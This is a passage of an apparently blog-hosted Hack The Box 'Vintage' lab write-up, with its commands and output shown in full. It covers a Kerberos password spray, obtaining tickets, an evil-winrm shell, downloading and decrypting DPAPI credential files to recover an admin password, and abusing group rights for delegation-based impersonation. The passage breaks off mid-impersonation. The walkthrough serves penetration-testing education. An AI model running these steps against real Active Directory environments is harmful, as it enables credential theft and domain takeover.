+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ kerbrute passwordspray -d vintage.htb --dc 10.10.11.45 ./users.txt <span class=s1>&#39;Zer0the0ne&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    __             __               __     
+</span></span><span class=line><span class=cl>   / /_____  _____/ /_  _______  __/ /____ 
+</span></span><span class=line><span class=cl>  / //_/ _ <span class=se>\/</span> ___/ __ <span class=se>\/</span> ___/ / / / __/ _ <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span class=line><span class=cl>/_/<span class=p>|</span>_<span class=p>|</span><span class=se>\_</span>__/_/  /_.___/_/   <span class=se>\_</span>_,_/<span class=se>\_</span>_/<span class=se>\_</span>__/                                        
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Version: dev <span class=o>(</span>9cfb81e<span class=o>)</span> - 03/17/25 - Ronnie Flathers @ropnop
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>2025/03/17 23:50:27 &gt;  Using KDC<span class=o>(</span>s<span class=o>)</span>:
+</span></span><span class=line><span class=cl>2025/03/17 23:50:27 &gt;  	10.10.11.45:88
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>2025/03/17 23:50:28 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID LOGIN:	C.Neri@vintage.htb:Zer0the0ne
+</span></span><span class=line><span class=cl>2025/03/17 23:50:28 &gt;  Done! Tested <span class=m>17</span> logins <span class=o>(</span><span class=m>1</span> successes<span class=o>)</span> in 0.606 seconds
+</span></span></code></pre></td></tr></table></div></div><p>Once again i will get back to <code>Bloodhound</code> and see what we can do with this account. And <code>C.Neri</code> has <code>canPSRemote</code> to the <code>DC01</code>.</p><p><img src=/p/vintage-htb-writeup/Bloodhound6.png width=496 height=213 srcset="/p/vintage-htb-writeup/Bloodhound6_hu_1ff99e0263491249.png 480w, /p/vintage-htb-writeup/Bloodhound6_hu_55ce82d17f5ca058.png 1024w" loading=lazy alt=Bloodhound class=gallery-image data-flex-grow=232 data-flex-basis=558px></p><p>Next thing i will do is get a TGT for this account and export it to the <code>KRB5CCNAME</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ getTGT.py vintage.htb/c.neri:Zer0the0ne -dc-ip vintage.htb 
+</span></span><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in c.neri.ccache
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>c.neri.ccache  
+</span></span></code></pre></td></tr></table></div></div><p>Then i will connect to the DC using <code>evil-winrm</code> using the <code>-r</code> flag.
+And we retrieved the user&rsquo;s flag.</p><p><img src=/p/vintage-htb-writeup/Evil-WinRM.png width=960 height=534 srcset="/p/vintage-htb-writeup/Evil-WinRM_hu_8af28ce73153d8ba.png 480w, /p/vintage-htb-writeup/Evil-WinRM_hu_30c96fb88d5f3413.png 1024w" loading=lazy alt=Evil-WinRM class=gallery-image data-flex-grow=179 data-flex-basis=431px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ evil-winrm -i dc01.vintage.htb -r <span class=s1>&#39;vintage.htb&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                                        
+</span></span><span class=line><span class=cl>Evil-WinRM shell v3.7
+</span></span><span class=line><span class=cl>                                        
+</span></span><span class=line><span class=cl>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class=sb>`</span>quoting_detection_proc<span class=err>&#39;</span> <span class=k>for</span> module Reline
+</span></span><span class=line><span class=cl>                                        
+</span></span><span class=line><span class=cl>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class=line><span class=cl>                                        
+</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
+</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\C</span>.Neri<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ..<span class=se>\D</span>esktop
+</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\C</span>.Neri<span class=se>\D</span>esktop&gt; <span class=nb>type</span> user.txt
+</span></span><span class=line><span class=cl>8853092457944387a12897bef73bc3e8
+</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\C</span>.Neri<span class=se>\D</span>esktop&gt; 
+</span></span></code></pre></td></tr></table></div></div><p>After a long time enumerating for any kind of privesc vectors either in <code>Bloodhound</code> or using the shell i got, i finally found this hidden file which indicates the presence of Credentials protected using <code>DPAPI</code>, which i downloaded on my local machine.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PowerShell data-lang=PowerShell><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>C</span><span class=p>.</span><span class=n>Neri</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Roaming</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>\</span><span class=n>Credentials</span><span class=p>&gt;</span> <span class=nb>mv </span><span class=n>C4BB96844A5C9DD45D5B6A9859252BA6</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>c</span><span class=p>.</span><span class=n>neri</span><span class=p>\</span><span class=n>Desktop</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>C</span><span class=p>.</span><span class=n>Neri</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Roaming</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>\</span><span class=n>Credentials</span><span class=p>&gt;</span> <span class=nb>dir </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>c</span><span class=p>.</span><span class=n>neri</span><span class=p>\</span><span class=n>Desktop</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>Directory</span><span class=err>:</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>c</span><span class=p>.</span><span class=n>neri</span><span class=p>\</span><span class=n>Desktop</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Mode</span>                 <span class=n>LastWriteTime</span>         <span class=n>Length</span> <span class=n>Name</span>
+</span></span><span class=line><span class=cl><span class=p>----</span>                 <span class=p>-------------</span>         <span class=p>------</span> <span class=p>----</span>
+</span></span><span class=line><span class=cl><span class=n>-a</span><span class=p>----</span>          <span class=mf>6</span><span class=p>/</span><span class=mf>7</span><span class=p>/</span><span class=mf>2024</span>   <span class=mf>1</span><span class=err>:</span><span class=mf>17</span> <span class=n>PM</span>           <span class=mf>2312</span> <span class=n>Microsoft</span> <span class=n>Edge</span><span class=p>.</span><span class=py>lnk</span>
+</span></span><span class=line><span class=cl><span class=n>-ar</span><span class=p>---</span>         <span class=mf>3</span><span class=p>/</span><span class=mf>17</span><span class=p>/</span><span class=mf>2025</span>  <span class=mf>12</span><span class=err>:</span><span class=mf>02</span> <span class=n>PM</span>             <span class=mf>34</span> <span class=n>user</span><span class=p>.</span><span class=py>txt</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>c</span><span class=p>.</span><span class=n>neri</span><span class=p>\</span><span class=n>Desktop</span><span class=p>&gt;</span> <span class=n>attrib</span> <span class=n>-h</span> <span class=n>-s</span> <span class=n>C4BB96844A5C9DD45D5B6A9859252BA6</span>
+</span></span><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>c</span><span class=p>.</span><span class=n>neri</span><span class=p>\</span><span class=n>Desktop</span><span class=p>&gt;</span> <span class=n>download</span> <span class=n>C4BB96844A5C9DD45D5B6A9859252BA6</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Info</span><span class=err>:</span> <span class=n>Downloading</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>c</span><span class=p>.</span><span class=n>neri</span><span class=p>\</span><span class=n>Desktop</span><span class=p>\</span><span class=n>C4BB96844A5C9DD45D5B6A9859252BA6</span> <span class=n>to</span> <span class=n>C4BB96844A5C9DD45D5B6A9859252BA6</span>
+</span></span><span class=line><span class=cl>                                        
+</span></span><span class=line><span class=cl><span class=n>Info</span><span class=err>:</span> <span class=n>Download</span> <span class=n>successful</span><span class=p>!</span>
+</span></span></code></pre></td></tr></table></div></div><p>For now we still need the keys to decrypt these potential credentials. and for that we went to the <code>Protect</code> directory where keys usually are found, and we found this directory with an <code>SID</code> name.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PowerShell data-lang=PowerShell><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>c</span><span class=p>.</span><span class=n>neri</span><span class=p>\</span><span class=n>Desktop</span><span class=p>&gt;</span> <span class=nb>cd </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>C</span><span class=p>.</span><span class=n>Neri</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Roaming</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>\</span><span class=n>Protect</span>
+</span></span><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>C</span><span class=p>.</span><span class=n>Neri</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Roaming</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>\</span><span class=n>Protect</span><span class=p>&gt;</span> <span class=nb>dir
+</span></span></span><span class=line><span class=cl><span class=nb></span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>Directory</span><span class=err>:</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>C</span><span class=p>.</span><span class=n>Neri</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Roaming</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>\</span><span class=n>Protect</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Mode</span>                 <span class=n>LastWriteTime</span>         <span class=n>Length</span> <span class=n>Name</span>
+</span></span><span class=line><span class=cl><span class=p>----</span>                 <span class=p>-------------</span>         <span class=p>------</span> <span class=p>----</span>
+</span></span><span class=line><span class=cl><span class=n>d</span><span class=p>--</span><span class=n>-s</span><span class=p>-</span>          <span class=mf>6</span><span class=p>/</span><span class=mf>7</span><span class=p>/</span><span class=mf>2024</span>   <span class=mf>1</span><span class=err>:</span><span class=mf>17</span> <span class=n>PM</span>                <span class=n>S</span><span class=p>-</span><span class=mf>1</span><span class=p>-</span><span class=mf>5</span><span class=p>-</span><span class=mf>21</span><span class=p>-</span><span class=mf>4024337825</span><span class=p>-</span><span class=mf>2033394866</span><span class=p>-</span><span class=mf>2055507597</span><span class=p>-</span><span class=mf>1115</span>
+</span></span></code></pre></td></tr></table></div></div><p>Inside this directory, we found 2 potential <strong>Master keys</strong> which are <code>4dbf04d8-529b-4b4c-b4ae-8e875e4fe847</code> and <code>4dbf04d8-529b-4b4c-b4ae-8e875e4fe847</code>, which we will download locally for decryption.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PowerShell data-lang=PowerShell><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>C</span><span class=p>.</span><span class=n>Neri</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Roaming</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>\</span><span class=n>Protect</span><span class=p>\</span><span class=n>S</span><span class=p>-</span><span class=mf>1</span><span class=p>-</span><span class=mf>5</span><span class=p>-</span><span class=mf>21</span><span class=p>-</span><span class=mf>4024337825</span><span class=p>-</span><span class=mf>2033394866</span><span class=p>-</span><span class=mf>2055507597</span><span class=p>-</span><span class=mf>1115</span><span class=p>&gt;</span> <span class=nb>dir </span><span class=n>-h</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>Directory</span><span class=err>:</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>C</span><span class=p>.</span><span class=n>Neri</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Roaming</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>\</span><span class=n>Protect</span><span class=p>\</span><span class=n>S</span><span class=p>-</span><span class=mf>1</span><span class=p>-</span><span class=mf>5</span><span class=p>-</span><span class=mf>21</span><span class=p>-</span><span class=mf>4024337825</span><span class=p>-</span><span class=mf>2033394866</span><span class=p>-</span><span class=mf>2055507597</span><span class=p>-</span><span class=mf>1115</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Mode</span>                 <span class=n>LastWriteTime</span>         <span class=n>Length</span> <span class=n>Name</span>
+</span></span><span class=line><span class=cl><span class=p>----</span>                 <span class=p>-------------</span>         <span class=p>------</span> <span class=p>----</span>
+</span></span><span class=line><span class=cl><span class=n>-a-hs</span><span class=p>-</span>          <span class=mf>6</span><span class=p>/</span><span class=mf>7</span><span class=p>/</span><span class=mf>2024</span>   <span class=mf>1</span><span class=err>:</span><span class=mf>17</span> <span class=n>PM</span>            <span class=mf>740</span> <span class=n>4dbf04d8</span><span class=p>-</span><span class=n>529b</span><span class=p>-</span><span class=n>4b4c-b4ae</span><span class=p>-</span><span class=n>8e875e4fe847</span>
+</span></span><span class=line><span class=cl><span class=n>-a-hs</span><span class=p>-</span>          <span class=mf>6</span><span class=p>/</span><span class=mf>7</span><span class=p>/</span><span class=mf>2024</span>   <span class=mf>1</span><span class=err>:</span><span class=mf>17</span> <span class=n>PM</span>            <span class=mf>740</span> <span class=n>99cf41a3-a552</span><span class=p>-</span><span class=n>4cf7-a8d7-aca2d6f7339b</span>
+</span></span><span class=line><span class=cl><span class=n>-a-hs</span><span class=p>-</span>          <span class=mf>6</span><span class=p>/</span><span class=mf>7</span><span class=p>/</span><span class=mf>2024</span>   <span class=mf>1</span><span class=err>:</span><span class=mf>17</span> <span class=n>PM</span>            <span class=mf>904</span> <span class=nb>BK-VINTAGE</span>
+</span></span><span class=line><span class=cl><span class=n>-a-hs</span><span class=p>-</span>          <span class=mf>6</span><span class=p>/</span><span class=mf>7</span><span class=p>/</span><span class=mf>2024</span>   <span class=mf>1</span><span class=err>:</span><span class=mf>17</span> <span class=n>PM</span>             <span class=mf>24</span> <span class=n>Preferred</span>
+</span></span></code></pre></td></tr></table></div></div><p>The first step involves decrypting the <strong>Master Key</strong> using the <code>impacket-dpapi</code> tool. The Master Key is encrypted and tied to the user&rsquo;s <code>SID</code> and password.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
+</span></span><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>MASTERKEYFILE<span class=o>]</span>
+</span></span><span class=line><span class=cl>Version     :        <span class=m>2</span> <span class=o>(</span>2<span class=o>)</span>
+</span></span><span class=line><span class=cl>Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+</span></span><span class=line><span class=cl>Flags       :        <span class=m>0</span> <span class=o>(</span>0<span class=o>)</span>
+</span></span><span class=line><span class=cl>Policy      :        <span class=m>0</span> <span class=o>(</span>0<span class=o>)</span>
+</span></span><span class=line><span class=cl>MasterKeyLen: <span class=m>00000088</span> <span class=o>(</span>136<span class=o>)</span>
+</span></span><span class=line><span class=cl>BackupKeyLen: <span class=m>00000068</span> <span class=o>(</span>104<span class=o>)</span>
+</span></span><span class=line><span class=cl>CredHistLen : <span class=m>00000000</span> <span class=o>(</span>0<span class=o>)</span>
+</span></span><span class=line><span class=cl>DomainKeyLen: <span class=m>00000174</span> <span class=o>(</span>372<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Decrypted key with User Key <span class=o>(</span>MD4 protected<span class=o>)</span>
+</span></span><span class=line><span class=cl>Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
+</span></span></code></pre></td></tr></table></div></div><p>Once the Master Key is decrypted, it can be used to decrypt stored credentials. This command decrypts the credential file using the extracted Master Key.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
+</span></span><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>CREDENTIAL<span class=o>]</span>
+</span></span><span class=line><span class=cl>LastWritten : 2024-06-07 15:08:23
+</span></span><span class=line><span class=cl>Flags       : 0x00000030 <span class=o>(</span>CRED_FLAGS_REQUIRE_CONFIRMATION<span class=p>|</span>CRED_FLAGS_WILDCARD_MATCH<span class=o>)</span>
+</span></span><span class=line><span class=cl>Persist     : 0x00000003 <span class=o>(</span>CRED_PERSIST_ENTERPRISE<span class=o>)</span>
+</span></span><span class=line><span class=cl>Type        : 0x00000001 <span class=o>(</span>CRED_TYPE_GENERIC<span class=o>)</span>
+</span></span><span class=line><span class=cl>Target      : LegacyGeneric:target<span class=o>=</span>admin_acc
+</span></span><span class=line><span class=cl>Description : 
+</span></span><span class=line><span class=cl>Unknown     : 
+</span></span><span class=line><span class=cl>Username    : vintage<span class=se>\c</span>.neri_adm
+</span></span><span class=line><span class=cl>Unknown     : Uncr4ck4bl3P4ssW0rd0312
+</span></span></code></pre></td></tr></table></div></div><p><code>Bloodhound</code> reveals that we can add ourselves to the <code>DELEGATEDAMINS</code> which from its name seems to be a good target.</p><p><img src=/p/vintage-htb-writeup/Bloodhound7.png width=658 height=256 srcset="/p/vintage-htb-writeup/Bloodhound7_hu_5eed3e6499c2663d.png 480w, /p/vintage-htb-writeup/Bloodhound7_hu_64f93e8276e7e542.png 1024w" loading=lazy alt=Bloodhound class=gallery-image data-flex-grow=257 data-flex-basis=616px></p><p>Now we will add <code>SVC_SQL</code>to this group using <code>bloodyAD</code>, as we have <code>GenericWrite</code> on it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d <span class=s2>&#34;VINTAGE.HTB&#34;</span> -u c.neri_adm -p <span class=s1>&#39;Uncr4ck4bl3P4ssW0rd0312&#39;</span> -k add groupMember <span class=s2>&#34;DELEGATEDADMINS&#34;</span> <span class=s2>&#34;SVC_SQL&#34;</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> SVC_SQL added to DELEGATEDADMINS
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ bloodyAD --host dc01.vintage.htb -d <span class=s2>&#34;VINTAGE.HTB&#34;</span> --dc-ip 10.10.11.45 -k <span class=nb>set</span> object <span class=s2>&#34;SVC_SQL&#34;</span> servicePrincipalName  -v <span class=s2>&#34;HTTP/skibbidy&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> SVC_SQL<span class=err>&#39;</span>s servicePrincipalName has been updated
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ getTGT.py -dc-ip 10.10.11.45 vintage/svc_sql:Zer0the0ne
+</span></span><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in svc_sql.ccache
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>svc_sql.ccache
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ getST.py -spn <span class=s1>&#39;HTTP/dc01.vintage.htb&#39;</span> -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k <span class=s1>&#39;vintage.htb/svc_sql:Zer0the0ne&#39;</span>
+</span></span><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Getting TGT <span class=k>for</span> user
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Impersonating L.BIANCHI_ADM
